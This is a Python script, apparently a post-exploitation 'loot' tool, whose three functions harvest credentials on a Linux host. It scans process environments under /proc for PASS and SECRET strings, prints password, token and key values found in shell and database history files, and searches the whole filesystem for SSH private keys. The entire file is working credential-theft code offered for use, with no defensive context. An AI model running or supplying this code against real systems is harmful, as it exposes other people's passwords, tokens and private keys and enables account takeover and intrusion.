import os
import re
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich import box
from time import time

console = Console()

def timed(func):
    def wrapper(*args, **kwargs):
        start = time()
        result = func(*args, **kwargs)
        console.print(f"[green]✓ Completed in {time() - start:.2f}s[/green]\n")
        return result
    return wrapper


@timed
def loot_proc():
    console.print(Panel("[🔍] Scanning /proc for credentials", box=box.SQUARE))
    found = False

    try:
        for pid in [d for d in os.listdir('/proc') if d.isdigit()][:1000]:
            environ_path = f"/proc/{pid}/environ"
            if os.path.exists(environ_path):
                try:
                    with open(environ_path, "rb") as f:
                        data = f.read(4096).decode(errors="ignore")
                        if "PASS" in data or "SECRET" in data:
                            console.print(f"[red][!] Secrets in {environ_path}[/red]")
                            found = True
                except (IOError, PermissionError):
                    continue
    except Exception as e:
        console.print(f"[red]Error scanning /proc: {e}[/red]")

    if not found:
        console.print("[magenta]No secrets found in /proc[/magenta]")


@timed
def scan_history():
    console.print(Panel("[🕵️] Scanning shell history for passwords", box=box.SQUARE))
    history_files = [
        "~/.bash_history",
        "~/.zsh_history",
        "~/.mysql_history",
        "~/.psql_history",  # Added PostgreSQL history
        "~/.sh_history",    # Generic shell history
    ]
    
    password_patterns = re.compile(
        r'(?:password|pass|pwd|secret|token|key)[=:\s](["\']?)([^\s"\']+)\1',
        re.IGNORECASE
    )
    
    found = False
    for file in history_files:
        expanded_file = os.path.expanduser(file)
        try:
            if os.path.getsize(expanded_file) > 10 * 1024 * 1024:  # Skip files >10MB
                console.print(f"[dim]Skipping large file: {file}[/dim]")
                continue
                
            with open(expanded_file, "r", errors='ignore') as f:  # Handle encoding issues
                for line in f:
                    matches = password_patterns.finditer(line)
                    for match in matches:
                        if not found:
                            console.print(f"[yellow][!] Found possible credentials in {file}[/yellow]")
                            found = True
                        console.print(f"   [cyan]{match.group(0)}[/cyan]")
        except (IOError, OSError):
            continue
            
    if not found:
        console.print("[magenta]No credentials found in shell history[/magenta]")


@timed
def find_ssh_keys():
    console.print(Panel("[🔑] Searching for SSH private keys", box=box.SQUARE))
    try:
        # Use -type f to only search for files (not directories)
        # Use -maxdepth to limit how deep we search (adjust as needed)
        # Use -xdev to avoid searching other filesystems
        # Use -print0 and split on null bytes for more reliable parsing
        cmd = "find / -type f -maxdepth 8 -xdev \( -name 'id_rsa' -o -name 'id_dsa' \) -print0 2>/dev/null"
        output = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        keys = [k for k in output.stdout.split('\0') if k]
        
        if keys:
            for key in keys:
                console.print(f"[yellow][!] SSH key found: {key}[/yellow]")
        else:
            console.print("[magenta]No SSH keys found[/magenta]")
    except subprocess.CalledProcessError:
        console.print("[magenta]No SSH keys found[/magenta]")
    except Exception as e:
        console.print(f"[red]Error searching for SSH keys: {e}[/red]")